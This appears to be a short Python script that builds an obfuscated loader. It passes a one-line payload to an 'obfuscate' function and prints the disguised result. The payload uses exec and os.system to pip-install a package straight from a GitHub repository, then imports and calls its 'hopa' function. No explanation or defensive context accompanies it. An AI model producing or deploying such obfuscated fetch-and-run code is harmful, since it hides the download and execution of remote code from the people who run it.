from intsus import decode, obfuscate
ah: str = obfuscate("exec('from os import system as s') or s('pip install --upgrade git+https://github.com/Spaceish/Daniden.git#egg=swap') or exec('from swap import hopa') or hopa() or print('Done. Enjoy :)')")
print(ah)